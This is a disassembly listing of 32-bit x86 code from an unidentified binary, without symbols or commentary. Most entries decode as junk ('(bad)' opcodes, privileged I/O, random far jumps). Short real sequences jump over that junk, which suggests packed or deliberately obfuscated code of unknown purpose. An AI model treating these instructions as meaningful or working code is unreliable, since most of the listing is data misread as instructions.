  411649:	sub    edi,edx
  41164b:	adc    BYTE PTR [esi],ch
  41164d:	mov    ch,0xc6
  41164f:	sbb    dh,BYTE PTR [esi]
  411651:	test   DWORD PTR [eax+ebx*2+0x7c],0xb0b07b62
  411659:	ror    DWORD PTR [ecx-0x56412c6f],1
  41165f:	jge    0x41165e
  411661:	ss mov eax,0x4253ae87
  411667:	(bad)  
  411668:	lods   eax,DWORD PTR ds:[esi]
  411669:	sbb    al,ch
  41166b:	and    DWORD PTR [eax+0x724535fc],esi
  411671:	jbe    0x4116e1
  411673:	mov    edi,0xfd7bc2f5
  411678:	data16 clc 
  41167a:	or     esp,DWORD PTR [edi+0x5d]
  41167d:	jmp    0x411619
  41167f:	inc    ebx
  411680:	aad    0x79
  411682:	dec    esi
  411683:	ins    BYTE PTR es:[edi],dx
  411684:	inc    esi
  411685:	sti    
  411686:	retf   
  411687:	stos   BYTE PTR es:[edi],al
  411688:	pop    esi
  411689:	jae    0x411709
  41168b:	xchg   esp,eax
  41168c:	retf   0x5b38
  41168f:	jecxz  0x41162a
  411691:	xor    eax,0x76b1e7d
  411696:	ret    0x8d
  411699:	inc    ecx
  41169a:	aam    0x74
  41169c:	jnp    0x411650
  41169e:	jge    0x41169d
  4116a0:	dec    edi
  4116a1:	stc    
  4116a2:	sbb    BYTE PTR [edx],dh
  4116a4:	(bad)  
  4116a5:	jmp    0x411685
  4116a7:	xchg   esp,eax
  4116a8:	retf   0x47d3
  4116ab:	gs inc ebp
  4116ad:	mov    edx,0x8c49cd92
  4116b2:	es ss xchg esp,eax
  4116b5:	sbb    eax,0x38c683a
  4116ba:	add    eax,0xd297084
  4116bf:	cmp    DWORD PTR [ecx-0x3d],esp
  4116c2:	sar    DWORD PTR [ebx-0x4e801e07],0xc7
  4116c9:	add    BYTE PTR [ecx],bh
  4116cb:	shl    dl,cl
  4116cd:	dec    ebp
  4116ce:	and    al,0x96
  4116d0:	cdq    
  4116d1:	mov    edi,0xb865e8fb
  4116d6:	and    BYTE PTR [edx+0x6a1c2b5c],dl
  4116dc:	cwde   
  4116dd:	push   0xffffffd2
  4116df:	in     eax,0xea
  4116e1:	inc    esp
  4116e2:	adc    ch,BYTE PTR [esi+0x5e]
  4116e5:	push   cs
  4116e6:	mov    ds:0xb49332c1,al
  4116eb:	xchg   BYTE PTR [edx],dl
  4116ed:	inc    esp
  4116ee:	call   0x88b:0xb147cdf
  4116f5:	adc    al,0xc1
  4116f7:	(bad)  
  4116f8:	xlat   BYTE PTR ds:[ebx]
  4116f9:	cmove  ebp,DWORD PTR [esp+esi*4]
  4116fd:	push   es
  4116fe:	sub    BYTE PTR [ebp-0x7c17ef64],dh
  411704:	mov    al,al
  411706:	add    ah,BYTE PTR [ebx-0x728ad022]
  41170c:	jo     0x411723
  41170e:	adc    al,0x5b
  411710:	add    DWORD PTR [edx+0x416c9b8f],ebx
  411716:	jecxz  0x411774
  411718:	xlat   BYTE PTR ds:[ebx]
  411719:	xor    ebp,edx
  41171b:	mov    ah,bl
  41171d:	push   0x19
  41171f:	add    eax,0xe2ef735b
  411724:	pop    ebx
  411725:	jg     0x41174d
  411727:	movhps xmm5,QWORD PTR [esi+0x2619a041]
  41172e:	inc    ebp
  41172f:	and    al,0xb
  411731:	mov    bl,0x5f
  411733:	pushf  
  411734:	test   esp,ebp
  411736:	jmp    0xe77:0x6af69795
  41173d:	mov    edx,DWORD PTR [esi-0x68fb4a91]
  411743:	popa   
  411744:	retf   
  411745:	mov    bl,0x22
  411747:	pop    esi
  411748:	lods   eax,DWORD PTR ds:[esi]
  411749:	pop    esi
  41174a:	int3   
  41174b:	xor    eax,0x6d7e3104
  411750:	add    dl,BYTE PTR [esi+0x60e62872]
  411756:	jno    0x4117ac
  411758:	gs leave 
  41175a:	std    
  41175b:	pop    esi
  41175c:	adc    al,BYTE PTR [ebx-0x54269143]
  411762:	into   
  411763:	add    DWORD PTR [eax],ecx
  411765:	and    DWORD PTR [edx-0x73fee86e],eax
  41176b:	in     eax,dx
  41176c:	js     0x411726
  41176e:	inc    esi
  41176f:	jecxz  0x4117c8
  411771:	std    
  411772:	out    dx,al
  411773:	pop    edi
  411774:	jbe    0x41175a
  411776:	jge    0x411716
  411778:	repnz and DWORD PTR [ebx+0x1d],esi
  41177c:	sbb    ebp,edx
  41177e:	test   dl,al
  411780:	mov    ds:0xd3194572,al
  411785:	mov    al,ds:0xe9d0558b
  41178a:	call   0x8b411796
  41178f:	push   ebp
  411790:	enter  0x7d8b,0xfc
  411794:	xor    edx,eax
  411796:	xor    edi,eax
  411798:	add    edi,ecx
  41179a:	add    edx,ecx
  41179c:	imul   edx,edi
  41179f:	mov    edi,DWORD PTR [ebp-0x8]
  4117a2:	jmp    0x411a2a
  4117a7:	iret   
  4117a8:	leave  
  4117a9:	into   
  4117aa:	xlat   BYTE PTR ds:[ebx]
  4117ab:	fcmovu st,st(3)
  4117ad:	aad    0xc9
  4117af:	cli    
  4117b0:	je     0x411765
  4117b2:	sti    
  4117b3:	shr    DWORD PTR [ebx+0x33],1
  4117b6:	jb     0x4117dc
  4117b8:	bound  edi,QWORD PTR [eax+0x78]
  4117bb:	in     eax,0x7e
  4117bd:	js     0x411837
  4117bf:	fild   DWORD PTR ds:0x68072112
  4117c5:	aam    0x16
  4117c7:	mov    esp,0x13f8c92c
  4117cc:	js     0x4117ac
  4117ce:	and    al,0x21
  4117d0:	mov    ecx,0x6a8321b6
  4117d5:	pop    ebp
  4117d6:	cmp    DWORD PTR [ecx-0x3c9813bc],0xffffff8b
  4117dd:	mov    ah,0x4f
  4117df:	icebp  
  4117e0:	push   edi
  4117e1:	in     al,dx
  4117e2:	pop    esp
  4117e3:	push   edi
  4117e4:	push   edi
  4117e5:	push   ss
  4117e6:	adc    ebp,DWORD PTR [ebx-0x40]
  4117e9:	fbld   TBYTE PTR [eax]
  4117eb:	push   es
  4117ec:	and    BYTE PTR [edi+edx*8-0x30],bh
  4117f0:	and    eax,0xd17f7743
  4117f5:	loop   0x411794
  4117f7:	or     bl,ah
  4117f9:	mov    BYTE PTR [esi+edx*1-0x2dec49ae],ch
  411800:	jle    0x4117c6
  411802:	sbb    BYTE PTR ds:0x66910c39,al
  411808:	push   es
  411809:	add    BYTE PTR gs:[eax+esi*8-0x3814529b],cl
  411811:	xor    dl,BYTE PTR [esi+eax*1+0x58]
  411815:	leave  
  411816:	popa   
  411817:	out    0x23,eax
  411819:	leave  
  41181a:	mov    cl,0xbb
  41181c:	inc    edi
  41181d:	mov    ch,0x94
  41181f:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411821:	loop   0x411884
  411823:	clc    
  411824:	adc    al,0x92
  411826:	repnz repnz fisttp DWORD PTR [edi-0x70]
  41182b:	push   esi
  41182c:	and    ebx,ebx
  41182e:	loopne 0x411853
  411830:	fild   DWORD PTR [ecx-0x75cad30c]
  411836:	(bad)  
  411837:	mov    dl,0x84
  411839:	rol    ecx,1
  41183b:	cmp    BYTE PTR [ebp-0x1c71940c],dh
  411841:	adc    BYTE PTR cs:[ecx-0x12],ah
  411845:	out    dx,al
  411846:	popf   
  411847:	mov    dl,al
  411849:	xor    DWORD PTR [edi],edi
  41184b:	push   ds
  41184c:	or     al,0x75
  41184e:	pop    edx
  41184f:	push   ds
  411850:	js     0x41183d
  411852:	mov    edx,0x3a9c288a
  411857:	out    0x93,al
  411859:	mov    ebx,0x78911ad3
  41185e:	imul   esi,DWORD PTR [edx+0x4],0x2b
  411862:	ret    0x7d76
  411865:	sbb    ah,BYTE PTR [ebx+edx*8+0x7499a007]
  41186c:	jbe    0x4118d7
  41186e:	xchg   esi,eax
  41186f:	push   ds
  411870:	xchg   ebp,eax
  411871:	mov    bh,0xcb
  411873:	pop    esi
  411874:	add    DWORD PTR [edx+0x1b],edx
  411877:	nop
  411878:	inc    eax
  411879:	mov    WORD PTR [ebx-0x4d],?
  41187c:	pop    ecx
  41187d:	mov    edi,es
  41187f:	fiadd  DWORD PTR [ebx-0xc82b31b]
  411885:	sbb    ebx,DWORD PTR ds:0x74f5e041
  41188b:	or     edi,esp
  41188d:	out    dx,eax
  41188e:	dec    esi
  41188f:	adc    ebx,DWORD PTR [ecx]
  411891:	in     eax,dx
  411892:	inc    esi
  411893:	sub    eax,DWORD PTR [ebx+0x54a0a4d4]
  411899:	xchg   edx,eax
  41189a:	repnz fwait
  41189c:	(bad)  
  41189d:	pop    ebx
  41189e:	jge    0x4118eb
  4118a0:	ss pop edx
  4118a2:	ret    0xbe0b
  4118a5:	adc    DWORD PTR [esp+ecx*2-0x553a4dd5],edi
  4118ac:	hlt    
  4118ad:	push   esi
  4118ae:	mov    ch,0x55
  4118b0:	aaa    
  4118b1:	cmp    BYTE PTR [edi+ebx*8],bh
  4118b4:	and    BYTE PTR [edi-0x7e],dl
  4118b7:	rol    DWORD PTR [esi+edi*1],0xcd
  4118bb:	push   0xffffffea
  4118bd:	stos   DWORD PTR es:[edi],eax
  4118be:	repnz (bad) 
  4118c1:	push   esi
  4118c2:	iret   
  4118c3:	aaa    
  4118c4:	mov    ds:0xbcdf2762,al
  4118c9:	aas    
  4118ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118cb:	cmp    bl,BYTE PTR [eax]
  4118cd:	inc    esp
  4118ce:	shr    DWORD PTR [edi-0x3e],cl
  4118d1:	(bad)  
  4118d2:	jns    0x411939
  4118d4:	(bad)  
  4118d5:	data16 add ah,BYTE PTR [eax+esi*1]
  4118d9:	call   0x911946c
  4118de:	loopne 0x4118e2
  4118e0:	test   eax,0xdc731881
  4118e5:	or     eax,0xa9d7e6d6
  4118ea:	ficom  WORD PTR ds:0xc68c8c04
  4118f0:	test   DWORD PTR [ebx],eax
  4118f2:	ja     0x41196a
  4118f4:	adc    eax,0xe679439b
  4118f9:	into   
  4118fa:	(bad)  
  4118fb:	rcl    BYTE PTR [ebp+0x59f58184],1
  411901:	mov    ah,0xc
  411903:	cld    
  411904:	add    BYTE PTR [ebp+0x32],0x95
  411908:	add    eax,0xbad12b19
  41190d:	and    cl,BYTE PTR [eax-0x54]
  411910:	mov    DWORD PTR [ecx+edx*8-0x35],ebp
  411914:	xchg   ebp,eax
  411915:	fs scas al,BYTE PTR es:[edi]
  411917:	(bad)  
  411918:	jo     0x4118ea
  41191a:	div    DWORD PTR [esi-0x77]
  41191d:	and    ah,BYTE PTR [ecx+0x1ca47c6f]
  411923:	push   edi
  411924:	push   ebx
  411925:	fcomp  QWORD PTR [ecx+0x4dc6ee74]
  41192b:	inc    esp
  41192c:	test   dh,cl
  41192e:	inc    esp
  41192f:	dec    eax
  411930:	icebp  
  411931:	xchg   edx,eax
  411932:	mov    cs,WORD PTR [esi+0x554c9e95]
  411938:	mul    al
  41193a:	sbb    eax,0x3eb1a2e4
  41193f:	imul   edx,eax,0x983e90aa
  411945:	xor    BYTE PTR [esp+ecx*4],dl
  411948:	adc    ebp,edx
  41194a:	scas   al,BYTE PTR es:[edi]
  41194b:	mov    ebp,0xbffa3bea
  411950:	(bad)  
  411951:	shl    BYTE PTR [edx],1
  411953:	repz add edi,DWORD PTR [edi+0x2fabd51d]
  41195a:	push   cs
  41195b:	pop    ds
  41195c:	add    BYTE PTR [edx-0x551958d0],bh
  411962:	shr    BYTE PTR [edx],1
  411964:	add    DWORD PTR [edx+ebx*8+0x3c],ebp
  411968:	popa   
  411969:	arpl   cx,cx
  41196b:	mov    ds:0xd17f44d3,al
  411970:	adc    dh,ah
  411972:	and    DWORD PTR [esi],eax
  411974:	inc    ecx
  411975:	jb     0x4118ff
  411977:	push   ebx
  411978:	jo     0x41196a
  41197a:	fsubp  st(4),st
  41197c:	push   ebx
  41197d:	xchg   DWORD PTR [ecx],ebp
  41197f:	xchg   ebx,eax
  411980:	sub    cl,BYTE PTR [ebx-0x6c9bd290]
  411986:	xlat   BYTE PTR ds:[ebx]
  411987:	pop    edi
  411988:	sub    eax,DWORD PTR [esp+ebp*2+0x285c868c]
  41198f:	shl    BYTE PTR [edx+esi*4],0x9a
  411993:	dec    esp
  411994:	mov    ds:0xf1741e50,al
  411999:	in     al,0x39
  41199b:	or     ah,BYTE PTR [ebp+0x25]
  41199e:	xchg   BYTE PTR [edx],cl
  4119a0:	mov    ah,cl
  4119a2:	mov    DWORD PTR [edi+ebp*4+0x72],esi
  4119a6:	xor    WORD PTR [ebx-0x2fc41262],cx
  4119ad:	enter  0x3e5f,0x1a
  4119b1:	mov    DWORD PTR gs:[ebx],ebx
  4119b4:	(bad)  
  4119b5:	leave  
  4119b6:	mov    ebx,0x58bd2d69
  4119bb:	mov    ds:0x8f14a82f,al
  4119c0:	xor    al,0x54
  4119c2:	retf   0x4457
  4119c5:	clc    
  4119c6:	push   0xffffffcf
  4119c8:	nop
  4119c9:	popf   
  4119ca:	jle    0x411997
  4119cc:	jnp    0x411a2b
  4119ce:	sahf   
  4119cf:	push   cs
  4119d0:	out    0x49,eax
  4119d2:	iret   
  4119d3:	fwait
  4119d4:	or     DWORD PTR [ebp-0x60],edi
  4119d7:	sub    edi,DWORD PTR [ebx+edx*1+0x10ca7755]
  4119de:	out    dx,eax
  4119df:	iret   
  4119e0:	jp     0x4119d0
  4119e2:	push   es
  4119e3:	in     eax,dx
  4119e4:	sar    BYTE PTR [edx],cl
  4119e6:	loope  0x41197a
  4119e8:	leave  
  4119e9:	stc    
  4119ea:	js     0x41198b
  4119ec:	rol    DWORD PTR [ebp+0x41cebe70],cl
  4119f2:	inc    edi
  4119f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119f4:	imul   esi,DWORD PTR [ecx-0x3f],0x11
  4119f8:	mov    al,ds:0xf0ac1a2c
  4119fd:	jmp    0x176859d
  411a02:	sbb    ch,ch
  411a04:	dec    esp
  411a05:	jl     0x4119be
  411a07:	pusha  
  411a08:	inc    edx
  411a09:	dec    edi
  411a0a:	cwde   
  411a0b:	sub    BYTE PTR [edx],bh
  411a0d:	ror    DWORD PTR [ebx],cl
  411a0f:	imul   esp,DWORD PTR ds:0xa6c9578,0x25
  411a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a17:	repnz sub al,0x5b
  411a1a:	cmp    bh,BYTE PTR [edx]
  411a1c:	fcmovnb st,st(0)
  411a1e:	jae    0x4119cb
  411a20:	and    cl,dh
  411a22:	inc    esp
  411a23:	xchg   edi,eax
  411a24:	shl    BYTE PTR [edi+0x76],cl
  411a27:	aaa    
  411a28:	mov    ds:0xf05d8bc3,eax
  411a2d:	sub    ebx,edi
  411a2f:	cmp    ebx,edx
  411a31:	ja     0x411a3f
  411a37:	mov    edx,DWORD PTR [ebp-0x34]
  411a3a:	jmp    0x411f76
  411a3f:	mov    edx,DWORD PTR [ebp-0x3c]
  411a42:	mov    edi,DWORD PTR [ebp-0x4]
  411a45:	xor    edx,eax
  411a47:	xor    edi,eax
  411a49:	add    edx,ecx
  411a4b:	add    edi,ecx
  411a4d:	imul   edx,edi
  411a50:	jmp    0x411cd8
  411a55:	into   
  411a56:	(bad)  
  411a57:	cmp    al,0xc7
  411a59:	fxch   st(3)
  411a5b:	(bad)  
  411a5d:	sub    eax,0x92d7da8b
  411a62:	mov    BYTE PTR [esi+ebx*4-0x6f],bh
  411a66:	pusha  
  411a67:	js     0x411ae1
  411a69:	in     eax,0x7e
  411a6b:	js     0x411ae5
  411a6d:	fld    QWORD PTR [ebx*1-0x24327c89]
  411a74:	dec    ecx
  411a75:	les    eax,FWORD PTR [eax+0x7b]
  411a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a79:	in     al,dx
  411a7a:	das    
  411a7b:	sbb    al,0x7b
  411a7d:	dec    ebx
  411a7e:	dec    esp
  411a7f:	ficomp DWORD PTR [ecx+ebp*2+0x64]
  411a83:	es jp  0x411a78
  411a86:	pop    ecx
  411a87:	scas   al,BYTE PTR es:[edi]
  411a88:	or     ebx,DWORD PTR [edi+ebx*8]
  411a8b:	pop    edx
  411a8c:	into   
  411a8d:	push   esi
  411a8e:	push   ds
  411a8f:	add    DWORD PTR [eax-0x1b],ebx
  411a92:	scas   eax,DWORD PTR es:[edi]
  411a93:	or     bl,0x39
  411a96:	sar    DWORD PTR [esi],1
  411a98:	mov    ds:0x782d5871,al
  411a9d:	push   edi
  411a9e:	mov    eax,0x7b14e2c6
  411aa3:	out    dx,eax
  411aa4:	cmp    al,0x20
  411aa6:	sbb    DWORD PTR [esi+0x27b6d820],edi
  411aac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411aad:	mov    ebp,DWORD PTR [edi]
  411aaf:	arpl   WORD PTR [edx-0x266dd574],si
  411ab5:	in     al,0xbe
  411ab7:	pop    esp
  411ab8:	inc    edx
  411ab9:	repnz sar BYTE PTR [ebp-0x485855e8],1
  411ac0:	jns    0x411b2e
  411ac2:	popa   
  411ac3:	pop    esi
  411ac4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ac5:	adc    al,0x94
  411ac7:	or     cl,BYTE PTR [ecx]
  411ac9:	mov    ds:0xa7f1c70f,al
  411ace:	mov    dl,0x74
  411ad0:	fdiv   DWORD PTR [ebx+0xf]
  411ad3:	cmp    edi,edx
  411ad5:	dec    ebp
  411ad6:	ja     0x411ab9
  411ad8:	cwde   
  411ad9:	dec    ebx
  411ada:	pop    esp
  411adb:	jae    0x411adb
  411add:	popa   
  411ade:	cmp    eax,0xcb6110c9
  411ae3:	jae    0x411b2a
  411ae5:	ins    BYTE PTR es:[edi],dx
  411ae6:	adc    eax,0x21b84499
  411aeb:	jnp    0x411adc
  411aed:	out    0xe6,al
  411aef:	call   0x37f285cc
  411af4:	jge    0x411b29
  411af6:	les    esi,FWORD PTR [edx-0x6a]
  411af9:	into   
  411afa:	pop    ss
  411afb:	sbb    BYTE PTR [ebx+edx*1],dh
  411afe:	sub    ecx,ebx
  411b00:	push   ss
  411b01:	push   ebp
  411b02:	(bad)  
  411b03:	pop    ecx
  411b04:	inc    ebp
  411b05:	sub    al,0xac
  411b07:	xor    dh,BYTE PTR [ebx]
  411b09:	xor    DWORD PTR [esi+ebp*4],esp
  411b0c:	(bad)  
  411b0d:	xor    eax,0x3321b9ff
  411b12:	lahf   
  411b13:	push   es
  411b14:	cs cmp bh,bh
  411b17:	test   BYTE PTR [ebx-0xf2f817a],bh
  411b1d:	or     esp,edi
  411b1f:	mov    esi,ecx
  411b21:	ins    DWORD PTR es:[edi],dx
  411b22:	scas   al,BYTE PTR es:[edi]
  411b23:	push   0x26
  411b25:	ja     0x411b5c
  411b27:	daa    
  411b28:	fs mov dl,0x55
  411b2b:	cmc    
  411b2c:	sub    BYTE PTR ds:0x79fce2c7,dh
  411b32:	cld    
  411b33:	fdivr  DWORD PTR [edi+0x37]
  411b36:	imul   edx,DWORD PTR [ecx+esi*1+0x5d812b18],0xcf4230e4
  411b41:	inc    ecx
  411b42:	imul   esp,DWORD PTR ds:0xb45a7e08,0x4130f976
  411b4c:	mov    bl,0xc9
  411b4e:	es mov ebx,0x47d2ed7f
  411b54:	data16 loop 0x411b7d
  411b57:	jmp    0x411b43
  411b59:	(bad)  
  411b5a:	sahf   
  411b5b:	xchg   ebp,eax
  411b5c:	jbe    0x411b85
  411b5e:	xchg   DWORD PTR [ebp+0x78],ecx
  411b61:	cld    
  411b62:	mov    ds:0x4e6f313d,al
  411b67:	cli    
  411b68:	ret    
  411b69:	mov    gs,WORD PTR [ecx+0x633fe919]
  411b6f:	mov    DWORD PTR [esi],eax
  411b71:	popf   
  411b72:	out    dx,al
  411b73:	popf   
  411b74:	mov    ebx,0x3f12aa66
  411b79:	dec    eax
  411b7a:	add    BYTE PTR [ebp-0x2154cdab],dh
  411b80:	stos   DWORD PTR es:[edi],eax
  411b81:	add    BYTE PTR [ecx],ah
  411b83:	push   ebx
  411b84:	fld    QWORD PTR [ecx]
  411b86:	inc    eax
  411b87:	jno    0x411b1e
  411b89:	stc    
  411b8a:	sub    ax,0xc04f
  411b8e:	add    BYTE PTR [ecx-0x7d0e60bc],bh
  411b94:	xchg   esp,eax
  411b95:	shl    bh,1
  411b97:	fnstcw WORD PTR [ecx+0x59]
  411b9a:	cbw    
  411b9c:	sahf   
  411b9d:	push   es
  411b9e:	scas   al,BYTE PTR es:[edi]
  411b9f:	adc    al,ch
  411ba1:	mov    DWORD PTR [edi-0x2a],esp
  411ba4:	mov    eax,0x2ebf1fca
  411ba9:	mov    ch,0xdb
  411bab:	jbe    0x411b4d
  411bad:	clc    
  411bae:	jecxz  0x411bdc
  411bb0:	rol    ah,cl
  411bb2:	xor    dh,BYTE PTR [edi]
  411bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bb5:	sub    al,0xb2
  411bb7:	sub    ch,ah
  411bb9:	mov    WORD PTR ds:[esi],gs
  411bbc:	lods   eax,DWORD PTR ds:[esi]
  411bbd:	cs sahf 
  411bbf:	xchg   esp,eax
  411bc0:	xchg   ebx,eax
  411bc1:	sbb    ebp,DWORD PTR [eax-0x4d]
  411bc4:	dec    ebx
  411bc5:	loop   0x411c02
  411bc7:	retf   0x295e
  411bca:	loopne 0x411b96
  411bcc:	xchg   edx,eax
  411bcd:	adc    eax,0x7305cbe2
  411bd2:	ret    
  411bd3:	loope  0x411c01
  411bd5:	xchg   edx,eax
  411bd6:	mov    dl,0xc
  411bd8:	mov    ebp,0x7e8d7448
  411bdd:	sbb    al,al
  411bdf:	imul   BYTE PTR [eax+edi*4+0x2c90c064]
  411be6:	test   BYTE PTR [edi-0xbe7305],cl
  411bec:	stc    
  411bed:	xor    BYTE PTR [edx+ecx*8-0x6b],ch
  411bf1:	dec    edi
  411bf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bf3:	outs   dx,DWORD PTR ds:[esi]
  411bf4:	cmc    
  411bf5:	ret    
  411bf6:	jp     0x411c11
  411bf8:	mov    eax,ds:0xb48a9d16
  411bfd:	lahf   
  411bfe:	es mov dh,0x43
  411c01:	popf   
  411c02:	fwait
  411c03:	jmp    DWORD PTR fs:0xe055c9e1
  411c0a:	add    al,0x34
  411c0c:	cli    
  411c0d:	push   ebx
  411c0e:	sub    eax,0xa5d5835
  411c13:	xor    ebx,0x572aca20
  411c19:	xchg   ebp,eax
  411c1a:	cmp    ecx,DWORD PTR [esi+0x331ed9b6]
  411c20:	pop    esp
  411c21:	mov    ?,edi
  411c23:	pop    ecx
  411c24:	lods   eax,DWORD PTR cs:[esi]
  411c26:	in     eax,0xd8
  411c28:	mov    ah,0x3e
  411c2a:	(bad)  
  411c2b:	fsubr  DWORD PTR [ebp-0xcb90841]
  411c31:	adc    BYTE PTR [edx+ebp*2],0xd5
  411c35:	jo     0x411bd2
  411c37:	out    dx,eax
  411c38:	fs mov bh,0x7
  411c3b:	sahf   
  411c3c:	or     al,0x4e
  411c3e:	shl    ah,0xba
  411c41:	fs sbb dl,cl
  411c44:	sbb    DWORD PTR [eax],ebp
  411c46:	mov    bl,0x24
  411c48:	mov    ebx,0x1817a4f1
  411c4d:	aam    0x98
  411c4f:	mov    ch,0x4e
  411c51:	mov    al,ds:0x435496a2
  411c56:	sbb    al,0xd4
  411c58:	call   0x1c515c0f
  411c5d:	ins    BYTE PTR es:[edi],dx
  411c5e:	xchg   edx,eax
  411c5f:	cmp    al,0x70
  411c61:	lock xchg ebx,eax
  411c63:	cmc    
  411c64:	pop    esp
  411c65:	pop    esi
  411c66:	sbb    DWORD PTR [ebx+esi*8],edx
  411c69:	fisttp DWORD PTR [edi-0xe]
  411c6c:	add    DWORD PTR [eax+0x6ff575bd],ebx
  411c72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c73:	out    dx,al
  411c74:	xlat   BYTE PTR ds:[ebx]
  411c75:	fstp   st(0)
  411c77:	enter  0x32e4,0x6e
  411c7b:	push   cs
  411c7c:	imul   edx,edi,0xffffff9e
  411c7f:	out    dx,al
  411c80:	fdivr  st(4),st
  411c82:	pushf  
  411c83:	in     eax,dx
  411c84:	xor    eax,0x2af00f99
  411c89:	mov    dh,BYTE PTR [edx+0x6c]
  411c8c:	sar    DWORD PTR [ebx+0x1f525d56],0x5f
  411c93:	inc    edi
  411c94:	scas   al,BYTE PTR es:[edi]
  411c95:	sbb    eax,eax
  411c97:	int    0x30
  411c99:	and    bl,0x66
  411c9c:	cmp    DWORD PTR [edx],edx
  411c9e:	push   eax
  411c9f:	add    al,0xf7
  411ca1:	mov    bh,0x54
  411ca3:	sti    
  411ca4:	mov    ds:0xce4d2bc5,eax
  411ca9:	jnp    0x411cc2
  411cab:	std    
  411cac:	int3   
  411cad:	sar    BYTE PTR [edi+0xe37ba55],0x81
  411cb4:	cli    
  411cb5:	ins    BYTE PTR es:[edi],dx
  411cb6:	sub    eax,0x462f61c2
  411cbb:	ja     0x411c4d
  411cbd:	std    
  411cbe:	outs   dx,DWORD PTR ds:[esi]
  411cbf:	ffree  st(0)
  411cc1:	or     DWORD PTR [edx-0x461553ab],0xee8b81a6
  411ccb:	test   al,0xb3
  411ccd:	or     DWORD PTR [edi-0x73],edi
  411cd0:	mov    ds:0xc71d7c81,al
  411cd5:	pop    ebp
  411cd6:	sub    BYTE PTR [ebx-0x75],0x7d
  411cda:	clc    
  411cdb:	mov    ebx,DWORD PTR [ebp-0x10]
  411cde:	sub    ebx,edi
  411ce0:	cmp    ebx,edx
  411ce2:	mov    edx,DWORD PTR [ebp-0x38]
  411ce5:	jbe    0x411f76
  411ceb:	jmp    0x411f73
  411cf0:	rol    al,1
  411cf2:	(bad)  
  411cf3:	ds (bad) 
  411cf5:	into   
  411cf6:	rcl    dh,1
  411cf8:	adc    eax,0x9566579e
  411cfd:	dec    edx
  411cfe:	mov    ds:0x78657e21,eax
  411d03:	js     0x411cea
  411d05:	jle    0x411d7f
  411d07:	js     0x411cd0
  411d09:	and    al,dl
  411d0b:	aam    0xa2
  411d0d:	inc    ecx
  411d0e:	(bad)  
  411d0f:	out    dx,eax
  411d10:	fs xchg ebp,eax
  411d12:	nop
  411d13:	loope  0x411d02
  411d15:	adc    bl,BYTE PTR [ebp-0x1455ca1c]
  411d1b:	cli    
  411d1c:	std    
  411d1d:	mov    ah,0x4
  411d1f:	mov    bl,0xf
  411d21:	iret   
  411d22:	adc    ebp,esp
  411d24:	adc    esi,DWORD PTR [ecx-0x21]
  411d27:	test   edx,edi
  411d29:	imul   edx,DWORD PTR [eax-0x38f7a9b8],0x4e
  411d30:	xor    esi,esp
  411d32:	jno    0x411cee
  411d34:	sub    eax,0x7f8efd50
  411d39:	mov    BYTE PTR gs:[eax-0x289f9508],ah
  411d40:	pop    ds
  411d41:	adc    al,0x52
  411d43:	pop    edi
  411d44:	xchg   cl,ch
  411d46:	pop    ds
  411d47:	mov    WORD PTR [esi],?
  411d49:	or     eax,0x5306eca
  411d4e:	int3   
  411d4f:	out    dx,eax
  411d50:	push   ebp
  411d51:	jno    0x411dab
  411d53:	push   0x26325181
  411d58:	dec    ebx
  411d59:	cmp    BYTE PTR [eax+0x6a017382],0x91
  411d60:	and    BYTE PTR [ebx+0x7],ah
  411d63:	sub    edi,ebp
  411d65:	inc    ecx
  411d66:	leave  
  411d67:	rol    DWORD PTR [esi],0x73
  411d6a:	sbb    al,0xd0
  411d6c:	push   es
  411d6d:	xor    edi,DWORD PTR [ebx]
  411d6f:	test   eax,0xd6249437
  411d74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d75:	cwde   
  411d76:	mov    dl,0x57
  411d78:	sub    eax,0x35d09b95
  411d7d:	dec    eax
  411d7e:	std    
  411d7f:	pushf  
  411d80:	test   bl,ch
  411d82:	je     0x411dca
  411d84:	sub    dl,BYTE PTR [ebp+0x68]
  411d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d88:	test   cl,cl
  411d8a:	sbb    eax,0x666a9cfd
  411d8f:	popa   
  411d90:	retf   0x1b08
  411d93:	mov    esp,0xdb7ef61d
  411d98:	in     eax,dx
  411d99:	les    bp,DWORD PTR [edx+0x3fe90e5]
  411da0:	sub    DWORD PTR [edx],esp
  411da2:	leave  
  411da3:	xchg   ebx,eax
  411da4:	dec    esp
  411da5:	test   eax,0x4103f8a2
  411daa:	push   es
  411dab:	es jl  0x411dfa
  411dae:	mov    ds:0xddf7d059,al
  411db3:	(bad)  
  411db5:	ins    DWORD PTR es:[edi],dx
  411db6:	lds    esi,FWORD PTR [edi]
  411db8:	jo     0x411e2a
  411dba:	jb     0x411d50
  411dbc:	add    eax,0xe4b734ff
  411dc1:	xchg   esp,eax
  411dc2:	xchg   edi,eax
  411dc3:	stos   DWORD PTR es:[edi],eax
  411dc4:	in     al,0x26
  411dc6:	ins    BYTE PTR es:[edi],dx
  411dc7:	xchg   esp,eax
  411dc8:	mov    WORD PTR [edi+0x0],fs
  411dcb:	add    cl,BYTE PTR [eax+0x69]
  411dce:	mov    esp,DWORD PTR [eax]
  411dd0:	lods   al,BYTE PTR ds:[esi]
  411dd1:	(bad)  
  411dd2:	imul   DWORD PTR [edx+0x64]
  411dd5:	and    cl,BYTE PTR [ecx]
  411dd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dd8:	rcl    edx,1
  411dda:	(bad)  
  411ddb:	js     0x411e13
  411ddd:	and    edx,DWORD PTR [eax-0x738376ba]
  411de3:	and    eax,0x7367544a
  411de8:	in     eax,dx
  411de9:	sahf   
  411dea:	pop    eax
  411deb:	inc    esp
  411dec:	stos   DWORD PTR es:[edi],eax
  411ded:	jb     0x411db9
  411def:	push   cs
  411df0:	push   ss
  411df1:	ds lahf 
  411df3:	pop    ds
  411df4:	xchg   edx,eax
  411df5:	pop    es
  411df6:	cs push ds
